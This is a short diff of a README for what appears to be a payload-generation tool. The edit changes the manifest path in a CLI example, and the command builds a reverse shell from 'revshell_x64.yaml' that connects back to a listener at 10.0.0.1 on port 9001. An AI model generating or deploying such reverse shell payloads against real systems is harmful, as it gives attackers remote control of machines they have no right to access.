@@ -206,7 +206,7 @@ encode it without re-running the full build pipeline.
 ### From CLI
 
 ```bash
-uv run emitrion emitrion/manifests/x64/revshell_x64.yaml --lhost 10.0.0.1 --lport 9001 --no-assemble --out emitter_out/
+uv run emitrion emitrion/manifests/win-x64/revshell_x64.yaml --lhost 10.0.0.1 --lport 9001 --no-assemble --out emitter_out/
 ```
 
 The main `build()` function auto-detects `arch: x64` in the manifest and routes
